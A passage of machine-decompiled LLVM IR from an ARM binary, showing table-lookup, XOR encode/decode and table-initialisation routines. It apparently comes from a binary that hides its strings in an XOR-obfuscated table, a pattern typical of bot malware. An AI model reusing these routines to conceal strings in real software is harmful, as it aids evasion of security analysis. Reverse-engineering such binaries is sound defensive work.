  uselistorder i32* @sl, { 9, 3, 5, 6, 10, 4, 7, 8, 13, 12, 11, 14, 15, 16, 17, 18, 19, 20, 21, 24, 22, 23, 2, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 0, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 1, 111, 112, 113, 114 }
  uselistorder i32* @sb, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 36, 37, 38, 41, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* @r8, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 1, 35, 2, 36, 3, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 50, 51, 49, 52, 53, 54, 55, 57, 56, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 87, 83, 84, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 126, 123, 124, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 152, 150, 153, 154, 155, 156, 157, 158, 159 }
  uselistorder i32* @r5, { 57, 58, 59, 60, 49, 50, 40, 15, 16, 61, 45, 62, 63, 64, 65, 66, 67, 17, 18, 19, 20, 21, 41, 46, 12, 13, 14, 51, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 42, 43, 44, 52, 53, 54, 55, 47, 48, 68, 69, 70, 71, 72, 56, 73, 74, 75, 76, 7, 77, 78, 79, 80, 81, 82, 83, 330, 331, 332, 333, 334, 335, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 0, 102, 103, 104, 105, 106, 107, 1, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 9, 121, 122, 123, 124, 125, 126, 127, 128, 10, 129, 130, 131, 132, 133, 134, 135, 141, 136, 137, 138, 139, 140, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 168, 160, 161, 162, 163, 164, 165, 166, 167, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 191, 183, 184, 185, 186, 187, 188, 189, 190, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 226, 218, 219, 220, 221, 222, 223, 224, 225, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 258, 250, 251, 252, 253, 254, 255, 256, 257, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 287, 281, 282, 283, 284, 285, 286, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 317, 309, 310, 311, 312, 313, 314, 315, 316, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 336, 337, 338, 339, 340, 341, 350, 342, 343, 344, 345, 346, 347, 348, 349, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 365, 366, 364, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 5, 404, 405, 406, 407, 408, 409, 410, 8, 411, 412, 2, 413, 414, 3, 415, 416, 4, 417, 418, 419, 420, 421, 422, 11, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 6, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465 }
  uselistorder label %dec_label_pc_12194, { 1, 0 }
  uselistorder label %dec_label_pc_11608.backedge.thread465, { 9, 4, 8, 2, 7, 3, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_11608.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %.thread229, { 1, 0 }
  uselistorder label %bb362, { 1, 0 }
  uselistorder label %dec_label_pc_11f3c, { 1, 0 }
  uselistorder label %dec_label_pc_11f08, { 1, 0 }
  uselistorder label %thread-pre-split80, { 1, 0 }
  uselistorder label %dec_label_pc_11e18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d44, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11d30, { 1, 0 }
  uselistorder label %dec_label_pc_11cd8, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_11be8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11bd4, { 1, 0 }
  uselistorder label %dec_label_pc_11b34, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11b20, { 1, 0 }
  uselistorder label %dec_label_pc_11a80, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11a6c, { 1, 0 }
  uselistorder label %dec_label_pc_11910, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_118fc, { 1, 0 }
  uselistorder label %dec_label_pc_11878, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11864, { 1, 0 }
  uselistorder label %dec_label_pc_117f4, { 1, 0 }
  uselistorder label %dec_label_pc_117e8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_117d4, { 1, 0 }
  uselistorder label %dec_label_pc_11790, { 2, 1, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11780, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb336, { 2, 1, 0 }
  uselistorder label %bb334, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11730, { 1, 0 }
  uselistorder label %dec_label_pc_116d8, { 1, 0 }
  uselistorder label %dec_label_pc_116d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1166c, { 1, 0 }
  uselistorder label %bb332, { 1, 0 }
  uselistorder label %dec_label_pc_11620, { 1, 0 }
  uselistorder label %dec_label_pc_11610, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11610.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_11604.loopexit, { 1, 4, 0, 2, 3 }
  uselistorder label %dec_label_pc_1158c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11578, { 1, 0 }
  uselistorder label %dec_label_pc_11454, { 7, 1, 8, 4, 5, 0, 6, 2, 3 }
  uselistorder label %dec_label_pc_1142c, { 1, 0 }
  uselistorder label %bb327, { 1, 0 }
  uselistorder label %bb325, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_11298.dec_label_pc_11298_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11280.dec_label_pc_11280_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11278, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11270, { 1, 0 }
  uselistorder label %dec_label_pc_11224, { 1, 0 }
  uselistorder label %dec_label_pc_110c8, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_110bc, { 1, 0 }
  uselistorder label %.thread52, { 2, 1, 0 }
  uselistorder label %.thread50, { 1, 0 }
  uselistorder label %dec_label_pc_10f24, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10f00, { 1, 0 }
  uselistorder label %dec_label_pc_10ef4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ed0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10eac, { 1, 0 }
  uselistorder label %bb289, { 1, 0 }
  uselistorder label %dec_label_pc_10e58, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_10b00, { 1, 0 }
}

define i32 @function_1219c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1219c:
  %v3_121a0 = mul i32 %arg1, 8
  %v2_121a4 = add i32 %v3_121a0, ptrtoint (i32* @global_var_1c244.323 to i32)
  %v2_121a8 = icmp eq i32* %arg2, null
  br i1 %v2_121a8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1219c
  %v3_121b411 = inttoptr i32 %v2_121a4 to i32*
  %v4_121b412 = load i32, i32* %v3_121b411, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_1219c
  %v2_121ac = add i32 %v3_121a0, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 5)
  %v3_121ac = inttoptr i32 %v2_121ac to i8*
  %v4_121ac = load i8, i8* %v3_121ac, align 1
  %v5_121ac = zext i8 %v4_121ac to i32
  %v2_121b0 = add i32 %v3_121a0, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 4)
  %v3_121b0 = inttoptr i32 %v2_121b0 to i8*
  %v4_121b0 = load i8, i8* %v3_121b0, align 4
  %v5_121b0 = zext i8 %v4_121b0 to i32
  %v3_121b4 = inttoptr i32 %v2_121a4 to i32*
  %v4_121b4 = load i32, i32* %v3_121b4, align 4
  %v5_121b8 = mul nuw nsw i32 %v5_121ac, 256
  %v6_121b8 = or i32 %v5_121b0, %v5_121b8
  store i32 %v6_121b8, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_121b4714 = phi i32 [ %v4_121b412, %.thread ], [ %v4_121b4, %bb ]
  ret i32 %v4_121b4714

; uselistorder directives
  uselistorder i32 %v2_121a4, { 1, 0 }
  uselistorder i32 %v3_121a0, { 2, 1, 0 }
  uselistorder i32* null, { 3, 7, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 2, 28, 29, 30, 0, 31, 6, 32, 33, 34, 41, 35, 36, 37, 38, 39, 40, 5, 42 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_121c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_121c8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_121c8 = mul i32 %arg1, 8
  %v3_121cc = load i32, i32* @r4, align 4
  store i32 %v3_121cc, i32* %stack_var_-20, align 4
  %v3_121dc = and i32 %v3_121c8, 2040
  %v2_121e0 = add i32 %v3_121dc, ptrtoint (i32* @global_var_1c244.323 to i32)
  store i32 %v2_121e0, i32* %lr.global-to-local, align 4
  %v1_121e8 = add i32 %v3_121dc, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 4)
  store i32 %v1_121e8, i32* %r7.global-to-local, align 4
  %v2_121ec = load i32, i32* @global_var_1c19c.326, align 4
  %v2_121f0 = inttoptr i32 %v1_121e8 to i8*
  %v3_121f0 = load i8, i8* %v2_121f0, align 4
  %v4_121f0 = zext i8 %v3_121f0 to i32
  store i32 %v4_121f0, i32* @r1, align 4
  %v1_121f4 = add i32 %v3_121dc, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 5)
  %v2_121f4 = inttoptr i32 %v1_121f4 to i8*
  %v3_121f4 = load i8, i8* %v2_121f4, align 1
  %v4_121f4 = zext i8 %v3_121f4 to i32
  %v3_121f8 = udiv i32 %v2_121ec, 256
  %v4_121fc = mul nuw nsw i32 %v4_121f4, 256
  %v5_121fc = or i32 %v4_121fc, %v4_121f0
  store i1 false, i1* @cpsr_n, align 1
  %v7_121fc = icmp eq i32 %v5_121fc, 0
  store i1 %v7_121fc, i1* @cpsr_z, align 1
  %v3_12200 = udiv i32 %v2_121ec, 65536
  %v1_12204 = urem i32 %v3_121f8, 256
  store i32 %v1_12204, i32* %r6.global-to-local, align 4
  %v1_12208 = urem i32 %v3_12200, 256
  store i32 %v1_12208, i32* %r5.global-to-local, align 4
  %v3_1220c = udiv i32 %v2_121ec, 16777216
  store i32 %v3_1220c, i32* %r4.global-to-local, align 4
  %v1_12210 = urem i32 %v2_121ec, 256
  br i1 %v7_121fc, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_121c8
  store i32 %v3_121cc, i32* @r4, align 4
  ret i32 %v1_12210

bb8:                                              ; preds = %dec_label_pc_121c8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_1221c, %bb8
  %v2_12228 = phi i32 [ %v1_12264, %dec_label_pc_1221c ], [ 0, %bb8 ]
  %v0_1221c = phi i32 [ %v0_1225c, %dec_label_pc_1221c ], [ %v2_121e0, %bb8 ]
  %v1_1221c = inttoptr i32 %v0_1221c to i32*
  %v2_1221c = load i32, i32* %v1_1221c, align 4
  %v2_12220 = add i32 %v2_1221c, %v2_12228
  %v3_12220 = inttoptr i32 %v2_12220 to i8*
  %v4_12220 = load i8, i8* %v3_12220, align 1
  %v6_12220 = zext i8 %v4_12220 to i32
  %v2_12224 = xor i32 %v6_12220, %v1_12210
  %v1_12228 = trunc i32 %v2_12224 to i8
  store i8 %v1_12228, i8* %v3_12220, align 1
  %v0_1222c = load i32, i32* %lr.global-to-local, align 4
  %v1_1222c = inttoptr i32 %v0_1222c to i32*
  %v2_1222c = load i32, i32* %v1_1222c, align 4
  %v0_12230 = load i32, i32* %ip.global-to-local, align 4
  %v2_12230 = add i32 %v0_12230, %v2_1222c
  %v3_12230 = inttoptr i32 %v2_12230 to i8*
  %v4_12230 = load i8, i8* %v3_12230, align 1
  %v6_12230 = zext i8 %v4_12230 to i32
  %v0_12234 = load i32, i32* %r6.global-to-local, align 4
  %v2_12234 = xor i32 %v0_12234, %v6_12230
  %v1_12238 = trunc i32 %v2_12234 to i8
  store i8 %v1_12238, i8* %v3_12230, align 1
  %v0_1223c = load i32, i32* %lr.global-to-local, align 4
  %v1_1223c = inttoptr i32 %v0_1223c to i32*
  %v2_1223c = load i32, i32* %v1_1223c, align 4
  %v0_12240 = load i32, i32* %ip.global-to-local, align 4
  %v2_12240 = add i32 %v0_12240, %v2_1223c
  %v3_12240 = inttoptr i32 %v2_12240 to i8*
  %v4_12240 = load i8, i8* %v3_12240, align 1
  %v6_12240 = zext i8 %v4_12240 to i32
  %v0_12244 = load i32, i32* %r5.global-to-local, align 4
  %v2_12244 = xor i32 %v0_12244, %v6_12240
  %v1_12248 = trunc i32 %v2_12244 to i8
  store i8 %v1_12248, i8* %v3_12240, align 1
  %v0_1224c = load i32, i32* %lr.global-to-local, align 4
  %v1_1224c = inttoptr i32 %v0_1224c to i32*
  %v2_1224c = load i32, i32* %v1_1224c, align 4
  store i32 %v2_1224c, i32* @r1, align 4
  %v0_12250 = load i32, i32* %ip.global-to-local, align 4
  %v2_12250 = add i32 %v0_12250, %v2_1224c
  %v3_12250 = inttoptr i32 %v2_12250 to i8*
  %v4_12250 = load i8, i8* %v3_12250, align 1
  %v6_12250 = zext i8 %v4_12250 to i32
  %v0_12254 = load i32, i32* %r4.global-to-local, align 4
  %v2_12254 = xor i32 %v0_12254, %v6_12250
  %v1_12258 = trunc i32 %v2_12254 to i8
  store i8 %v1_12258, i8* %v3_12250, align 1
  %v0_1225c = load i32, i32* %lr.global-to-local, align 4
  %v1_1225c = add i32 %v0_1225c, 4
  %v2_1225c = inttoptr i32 %v1_1225c to i8*
  %v3_1225c = load i8, i8* %v2_1225c, align 1
  %v4_1225c = zext i8 %v3_1225c to i32
  %v0_12260 = load i32, i32* %r7.global-to-local, align 4
  %v1_12260 = add i32 %v0_12260, 1
  %v2_12260 = inttoptr i32 %v1_12260 to i8*
  %v3_12260 = load i8, i8* %v2_12260, align 1
  %v4_12260 = zext i8 %v3_12260 to i32
  %v0_12264 = load i32, i32* %ip.global-to-local, align 4
  %v1_12264 = add i32 %v0_12264, 1
  store i32 %v1_12264, i32* %ip.global-to-local, align 4
  %v4_12268 = mul nuw nsw i32 %v4_12260, 256
  %v5_12268 = or i32 %v4_12268, %v4_1225c
  %v2_1226c = sub i32 %v5_12268, %v1_12264
  %v8_1226c = icmp slt i32 %v2_1226c, 0
  store i1 %v8_1226c, i1* @cpsr_n, align 1
  %v9_1226c = icmp eq i32 %v5_12268, %v1_12264
  store i1 %v9_1226c, i1* @cpsr_z, align 1
  %v8_12270 = icmp sgt i32 %v5_12268, %v1_12264
  br i1 %v8_12270, label %dec_label_pc_1221c, label %dec_label_pc_12274

dec_label_pc_12274:                               ; preds = %dec_label_pc_1221c
  %v2_12274 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12274, i32* @r4, align 4
  ret i32 %v1_12210

; uselistorder directives
  uselistorder i32 %v5_12268, { 0, 2, 1 }
  uselistorder i32 %v1_12264, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_1225c, { 1, 0 }
  uselistorder i32 %v1_12210, { 0, 2, 1 }
  uselistorder i32 %v2_121ec, { 3, 0, 1, 2 }
  uselistorder i1* @cpsr_n, { 1, 2, 0 }
}

define i32 @function_12280(i32 %arg1) local_unnamed_addr {
dec_label_pc_12280:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12280 = mul i32 %arg1, 8
  %v3_12284 = load i32, i32* @r4, align 4
  store i32 %v3_12284, i32* %stack_var_-20, align 4
  %v3_12294 = and i32 %v3_12280, 2040
  %v2_12298 = add i32 %v3_12294, ptrtoint (i32* @global_var_1c244.323 to i32)
  store i32 %v2_12298, i32* %lr.global-to-local, align 4
  %v1_122a0 = add i32 %v3_12294, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 4)
  store i32 %v1_122a0, i32* %r7.global-to-local, align 4
  %v2_122a4 = load i32, i32* @global_var_1c19c.326, align 4
  %v2_122a8 = inttoptr i32 %v1_122a0 to i8*
  %v3_122a8 = load i8, i8* %v2_122a8, align 4
  %v4_122a8 = zext i8 %v3_122a8 to i32
  %v1_122ac = add i32 %v3_12294, add (i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32 5)
  %v2_122ac = inttoptr i32 %v1_122ac to i8*
  %v3_122ac = load i8, i8* %v2_122ac, align 1
  %v4_122ac = zext i8 %v3_122ac to i32
  %v3_122b0 = udiv i32 %v2_122a4, 256
  %v4_122b4 = mul nuw nsw i32 %v4_122ac, 256
  %v5_122b4 = or i32 %v4_122b4, %v4_122a8
  %v7_122b4 = icmp eq i32 %v5_122b4, 0
  %v3_122b8 = udiv i32 %v2_122a4, 65536
  %v1_122bc = urem i32 %v3_122b0, 256
  store i32 %v1_122bc, i32* %r6.global-to-local, align 4
  %v1_122c0 = urem i32 %v3_122b8, 256
  store i32 %v1_122c0, i32* %r5.global-to-local, align 4
  %v3_122c4 = udiv i32 %v2_122a4, 16777216
  store i32 %v3_122c4, i32* %r4.global-to-local, align 4
  %v1_122c8 = urem i32 %v2_122a4, 256
  br i1 %v7_122b4, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_12280
  store i32 %v3_12284, i32* @r4, align 4
  ret i32 %v1_122c8

bb8:                                              ; preds = %dec_label_pc_12280
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_122d4

dec_label_pc_122d4:                               ; preds = %dec_label_pc_122d4, %bb8
  %v2_122e0 = phi i32 [ %v1_1231c, %dec_label_pc_122d4 ], [ 0, %bb8 ]
  %v0_122d4 = phi i32 [ %v0_12314, %dec_label_pc_122d4 ], [ %v2_12298, %bb8 ]
  %v1_122d4 = inttoptr i32 %v0_122d4 to i32*
  %v2_122d4 = load i32, i32* %v1_122d4, align 4
  %v2_122d8 = add i32 %v2_122d4, %v2_122e0
  %v3_122d8 = inttoptr i32 %v2_122d8 to i8*
  %v4_122d8 = load i8, i8* %v3_122d8, align 1
  %v6_122d8 = zext i8 %v4_122d8 to i32
  %v2_122dc = xor i32 %v6_122d8, %v1_122c8
  %v1_122e0 = trunc i32 %v2_122dc to i8
  store i8 %v1_122e0, i8* %v3_122d8, align 1
  %v0_122e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_122e4 = inttoptr i32 %v0_122e4 to i32*
  %v2_122e4 = load i32, i32* %v1_122e4, align 4
  %v0_122e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_122e8 = add i32 %v0_122e8, %v2_122e4
  %v3_122e8 = inttoptr i32 %v2_122e8 to i8*
  %v4_122e8 = load i8, i8* %v3_122e8, align 1
  %v6_122e8 = zext i8 %v4_122e8 to i32
  %v0_122ec = load i32, i32* %r6.global-to-local, align 4
  %v2_122ec = xor i32 %v0_122ec, %v6_122e8
  %v1_122f0 = trunc i32 %v2_122ec to i8
  store i8 %v1_122f0, i8* %v3_122e8, align 1
  %v0_122f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_122f4 = inttoptr i32 %v0_122f4 to i32*
  %v2_122f4 = load i32, i32* %v1_122f4, align 4
  %v0_122f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_122f8 = add i32 %v0_122f8, %v2_122f4
  %v3_122f8 = inttoptr i32 %v2_122f8 to i8*
  %v4_122f8 = load i8, i8* %v3_122f8, align 1
  %v6_122f8 = zext i8 %v4_122f8 to i32
  %v0_122fc = load i32, i32* %r5.global-to-local, align 4
  %v2_122fc = xor i32 %v0_122fc, %v6_122f8
  %v1_12300 = trunc i32 %v2_122fc to i8
  store i8 %v1_12300, i8* %v3_122f8, align 1
  %v0_12304 = load i32, i32* %lr.global-to-local, align 4
  %v1_12304 = inttoptr i32 %v0_12304 to i32*
  %v2_12304 = load i32, i32* %v1_12304, align 4
  %v0_12308 = load i32, i32* %ip.global-to-local, align 4
  %v2_12308 = add i32 %v0_12308, %v2_12304
  %v3_12308 = inttoptr i32 %v2_12308 to i8*
  %v4_12308 = load i8, i8* %v3_12308, align 1
  %v6_12308 = zext i8 %v4_12308 to i32
  %v0_1230c = load i32, i32* %r4.global-to-local, align 4
  %v2_1230c = xor i32 %v0_1230c, %v6_12308
  %v1_12310 = trunc i32 %v2_1230c to i8
  store i8 %v1_12310, i8* %v3_12308, align 1
  %v0_12314 = load i32, i32* %lr.global-to-local, align 4
  %v1_12314 = add i32 %v0_12314, 4
  %v2_12314 = inttoptr i32 %v1_12314 to i8*
  %v3_12314 = load i8, i8* %v2_12314, align 1
  %v4_12314 = zext i8 %v3_12314 to i32
  %v0_12318 = load i32, i32* %r7.global-to-local, align 4
  %v1_12318 = add i32 %v0_12318, 1
  %v2_12318 = inttoptr i32 %v1_12318 to i8*
  %v3_12318 = load i8, i8* %v2_12318, align 1
  %v4_12318 = zext i8 %v3_12318 to i32
  %v0_1231c = load i32, i32* %ip.global-to-local, align 4
  %v1_1231c = add i32 %v0_1231c, 1
  store i32 %v1_1231c, i32* %ip.global-to-local, align 4
  %v4_12320 = mul nuw nsw i32 %v4_12318, 256
  %v5_12320 = or i32 %v4_12320, %v4_12314
  %v8_12328 = icmp sgt i32 %v5_12320, %v1_1231c
  br i1 %v8_12328, label %dec_label_pc_122d4, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_122d4
  %v2_1232c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1232c, i32* @r4, align 4
  ret i32 %v1_122c8

; uselistorder directives
  uselistorder i32 %v1_1231c, { 1, 2, 0 }
  uselistorder i32 %v0_12314, { 1, 0 }
  uselistorder i32 %v1_122c8, { 0, 2, 1 }
  uselistorder i32 %v2_122a4, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 13, 10, 12, 11, 14, 16, 15, 18, 17, 20, 19, 21, 23, 22, 24, 31, 25, 32, 26, 33, 27, 34, 35, 28, 36, 29, 37, 30, 41, 38, 42, 39, 43, 40, 45, 44, 46, 47, 48, 52, 49, 53, 50, 54, 51, 55, 56, 57, 63, 58, 64, 59, 65, 60, 66, 61, 67, 62, 68, 69, 71, 70, 75, 72, 76, 73, 77, 74, 79, 78, 80, 81, 82, 87, 83, 88, 84, 89, 85, 86, 90, 96, 91, 97, 92, 98, 93, 95, 99, 100, 101, 94, 102, 103, 109, 104, 110, 105, 111, 106, 108, 112, 113, 114, 107, 117, 115, 118, 116, 119, 120, 121 }
}

define i32 @function_12338(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12338:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12338 = load i32, i32* @r4, align 4
  store i32 %v3_12338, i32* %stack_var_-36, align 4
  %v1_12340 = call i32* @malloc(i32 2)
  %v2_12340 = ptrtoint i32* %v1_12340 to i32
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c244.323 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_12340, i32* %r7.global-to-local, align 4
  %v3_1235c = call i32 @function_12db0(i32 %v2_12340, i32 ptrtoint (i32* @global_var_137f8.331 to i32), i32 2)
  %v0_12360 = load i32, i32* %r5.global-to-local, align 4
  %v0_12364 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12364, i32* @global_var_1c254.332, align 4
  %v1_12368 = trunc i32 %v0_12360 to i8
  store i8 %v1_12368, i8* bitcast (i32* @global_var_1c258.333 to i8*), align 4
  %v0_1236c = load i32, i32* %r6.global-to-local, align 4
  %v1_1236c = trunc i32 %v0_1236c to i8
  store i8 %v1_1236c, i8* bitcast (i32* @global_var_1c259.334 to i8*), align 4
  %v1_12370 = call i32* @malloc(i32 %v0_12360)
  %v3_12370 = ptrtoint i32* %v1_12370 to i32
  %v0_12374 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_12370, i32* %r7.global-to-local, align 4
  %v3_12380 = call i32 @function_12db0(i32 %v3_12370, i32 ptrtoint (i32* @global_var_137fc.336 to i32), i32 %v0_12374)
  %v0_12388 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12388, i32* @global_var_1c264.337, align 4
  %v0_1238c = load i32, i32* %r5.global-to-local, align 4
  %v1_1238c = trunc i32 %v0_1238c to i8
  store i8 %v1_1238c, i8* bitcast (i32* @global_var_1c268.338 to i8*), align 4
  %v0_12390 = load i32, i32* %r6.global-to-local, align 4
  %v1_12390 = trunc i32 %v0_12390 to i8
  store i8 %v1_12390, i8* bitcast (i32* @global_var_1c269.339 to i8*), align 4
  %v1_12394 = call i32* @malloc(i32 29)
  %v3_12394 = ptrtoint i32* %v1_12394 to i32
  store i32 %v3_12394, i32* %r5.global-to-local, align 4
  %v3_123a4 = call i32 @function_12db0(i32 %v3_12394, i32 ptrtoint (i32* @global_var_13800.341 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1c270.342 to i8*), align 4
  %v0_123b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_123b4, i32* @global_var_1c26c.343, align 4
  %v0_123b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_123b8 = trunc i32 %v0_123b8 to i8
  store i8 %v1_123b8, i8* bitcast (i32* @global_var_1c271.344 to i8*), align 4
  %v1_123bc = call i32* @malloc(i32 7)
  %v3_123bc = ptrtoint i32* %v1_123bc to i32
  store i32 7, i32* %r7.global-to-local, align 4
  store i32 %v3_123bc, i32* %r5.global-to-local, align 4
  %v3_123d0 = call i32 @function_12db0(i32 %v3_123bc, i32 ptrtoint (i32* @global_var_13820.346 to i32), i32 7)
  %v0_123d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_123d8, i32* @global_var_1c274.347, align 4
  %v0_123dc = load i32, i32* %r7.global-to-local, align 4
  %v1_123dc = trunc i32 %v0_123dc to i8
  store i8 %v1_123dc, i8* bitcast (i32* @global_var_1c278.348 to i8*), align 4
  %v0_123e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_123e0 = trunc i32 %v0_123e0 to i8
  store i8 %v1_123e0, i8* bitcast (i32* @global_var_1c279.349 to i8*), align 4
  %v1_123e4 = call i32* @malloc(i32 5)
  %v3_123e4 = ptrtoint i32* %v1_123e4 to i32
